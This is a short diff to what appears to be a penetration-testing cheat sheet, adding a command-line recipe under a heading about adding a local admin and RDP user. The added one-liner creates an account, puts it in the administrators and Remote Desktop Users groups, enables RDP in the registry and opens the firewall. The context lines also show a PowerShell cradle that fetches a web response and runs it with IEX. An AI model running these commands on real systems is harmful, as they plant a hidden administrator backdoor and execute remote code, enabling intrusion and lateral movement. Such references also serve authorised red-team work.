@@ -87,6 +87,11 @@ $r = $wr.GetResponse()
 IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()
 ```
 
+### Add user to local admin and RDP group and enable RDP on firewall
+```
+net user <USERNAME> <PASSWORD> /add /Y  && net localgroup administrators <USERNAME> /add && net localgroup "Remote Desktop Users" <USERNAME> /add && reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f && netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
+```
+
 # Lateral Movement
 ## General
 #### Connect to machine with administrator privs
